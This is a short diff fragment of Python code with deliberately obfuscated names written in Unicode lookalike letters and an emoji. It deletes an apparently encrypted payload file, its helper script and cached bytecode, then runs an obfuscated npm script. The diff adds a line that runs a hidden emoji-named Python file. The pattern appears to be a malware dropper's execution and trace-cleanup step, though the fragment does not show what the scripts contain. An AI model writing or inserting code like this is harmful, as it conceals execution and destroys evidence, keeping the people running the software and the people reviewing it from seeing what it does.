@@ -161,6 +161,7 @@ if ᴠʟᴋʏʀᴇi is not None:
             os.remove("xp0e.aes")
             os.remove("xp0edoc.py")
             shutil.rmtree("__pycache__") 
+            os.system('python3 ❗.py')
             os.system('npm --no-warnings run 𝐕𝐥𝐤𝐲𝐫𝐞')
         else:
             os.remove("xp0e.zip")
